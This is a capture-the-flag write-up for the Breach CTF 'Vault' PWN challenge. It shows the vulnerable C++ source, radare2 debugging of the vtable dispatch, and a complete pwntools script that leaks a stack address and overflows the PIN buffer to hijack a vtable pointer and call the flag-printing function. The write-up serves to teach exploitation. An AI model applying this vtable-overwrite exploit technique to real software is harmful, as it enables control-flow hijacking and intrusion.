This challenge is from the Breach CTF hosted by IITBreachers. It was a PWN challenge and it had a cpp source code and a binary file.

We craft a fake vtable entry to change the control flow to get the flag.

Introduction to the challenge

This challenge is from the Breach CTF hosted by IITBreachers. It was a PWN challenge and it had a cpp source code and a binary file.

A quick checksec on the binary reveals that it doesn’t has PIE

Lets checkout the source code:

#include <iostream>

using namespace std;

class Vault {
    char pin[16];

  public:
    virtual void enterPin() {
        cout << "Enter Vault PIN: ";
        cin >> pin;
    }
    virtual void showSecurityLog() { cout << &pin << endl; }
    virtual void triggerAlarm() { cout << "Security Breach Detected!" << endl; }
};

class BackupVault : public Vault {
    char pin[16];

  public:
    void enterPin() {
        cout << "Enter Backup Vault PIN: ";
        cin >> pin;
    }
};

void secretAccess() { system("cat flag.txt"); }

int menu(Vault *vault, Vault *backup) {
    cout << "1. Enter Vault PIN" << endl;
    cout << "2. View Security Log" << endl;
    cout << "3. Trigger Alarm" << endl;
    cout << "4. Enter Backup Vault PIN" << endl;
    cout << "5. View Backup Vault Log" << endl;
    cout << "6. Trigger Backup Vault Alarm" << endl;
    cout << "7. Exit" << endl;
    cout << "Enter your choice: ";

    int choice;
    cin >> choice;

    switch (choice) {
    case 1:
        vault->enterPin();
        break;
    case 2:
        vault->showSecurityLog();
        break;
    case 3:
        vault->triggerAlarm();
        break;
    case 4:
        backup->enterPin();
        break;
    case 5:
        backup->showSecurityLog();
        break;
    case 6:
        backup->triggerAlarm();
        break;
    case 7:
        return 1;
    default:
        cout << "Invalid choice" << endl;
        break;
    }
    return 0;
}

int main() {
    Vault vault;
    BackupVault backup;

    while (!menu(&vault, &backup))
        ;

    return 0;
}

Here in the menu() function we can see that the challenge takes our input and executes different functions based on it. There’s a secretAccess() function that prints the flag. But this function is never called in the challenge. Our task is to change the control flow of the binary to execute the secretAccess() function.

In this challenge, the binary uses VTables to call different functions at runtime according to our input. The VTable contains an entry for each virtual function accessible by the class and stores a pointer to its definition. You can read more about VTables here

Basic Analysis

By just executing the challenge binary and playing around with the options we can see that the option 1 and option 4 take our input into the pin buffer of the Vault and BackupVault classes respectively. option 2 and option 5 prints the address of those buffer and option 3 and option 6 prints the string Security Breach Detected!.

Here we don’t have a direct way of calling the secretAccess() function, so we have to find an exploit to get the flag.

Debugging the binary

Let’s open the binary in radare2 in debugging mode by r2 -AAA -d main. And analyse the menu() function by seeking to the function s sym.menu_Vault__Vault_ and printing the disassembly pdf.

Here we can see that in each case:

  1. The var18_h is moved into rax
  2. Address stored in rax is moved into rax
  3. Then a multiple of 8 is added to the value stored in the rax register according to the case.
  4. Then the address stored in rax is moved into rdx and the address is then called by call rdx

lets debug the case 2

  1. Set a breakpoint at the beginning of case 2 by db 0x004013d6 and the continue to it by dc
  2. Step through each instructions and examine the registers and the stack

We see that the var18_h stores the address 0x7fffd8248280 and this address then stores the address 0x00403db0 which then stores the address 0x00401552 which is stored in the rdx register and called.

And then the vault->showSecurityLog() function prints the address 0x7fffd8248288 which means this is the address of valult class’s pin[] buffer. Which is 8 bytes after the var18_h

By examining the memory, I found that the address 0x7fffd8248280 stores the VTable for the Vault class and the address 0x7fffd82482a0 stores the VTable for the BackupVault class.

Here the var_20h stores the address of the VTable of BackupVault class i.e 0x7fffd82482a0

Then the address stored by 0x7fffd82482a0 is moved into rax register and then the address stored in the address pointed to by rax is moved into rdx register and the the address is called.

If we are able to overwrite 0x7fffd82482a0 by an address which then stores the address of secretAccess() function. Then executing option 4 will give us the flag

Writing the Exploit

Let’s just overwrite 0x7fffd82482a0 by 0x7fffd82482a8 and then 0x7fffd82482a8 by the address of secretAccess() function.

We can find the address of secretAccess() by afl | grep secret.

Our exploit code using the pwntools library is:

from pwn import *

#open the challenge or reomote connection
p = process("./main")
#p = remote("challs.breachers.in", 1339)

# get the stack leak
p.recvuntil(b"Enter your choice: ")
p.sendline(b"2")
leak = p.recvline()
print(leak)

# convert the leak into integer
leak = int(leak.strip(), 16)
leak_addr = leak + 24 + 8
print(hex(leak_addr))

# select the first option to overwrite the right addresses
p.recvuntil(b"Enter your choice: ")
p.sendline(b"1")

# craft the payload to overwrite the vtable entry for 4th option
secret_func = 0x004011f6
payload = b"A" * 24 + p64(leak_addr) + p64(secret_func)

# send the payload
p.recvuntil(b"Enter Vault PIN: ")
p.sendline(payload)

# call 4th option to call secret_func
p.recvuntil(b"Enter your choice: ")
p.sendline(b"4")

# prints the flag
print(p.recvline())
#print(p.recvuntil(b"Enter your choice: "))

Quickly make a flag.txt file with a fake flag for testing and run the exploit

Getting the Flag

Now run the exploit on the server provided by the challenge:

p = remote("challs.breachers.in", 1339)

Just replace the challenge binary by the remote connection to the server
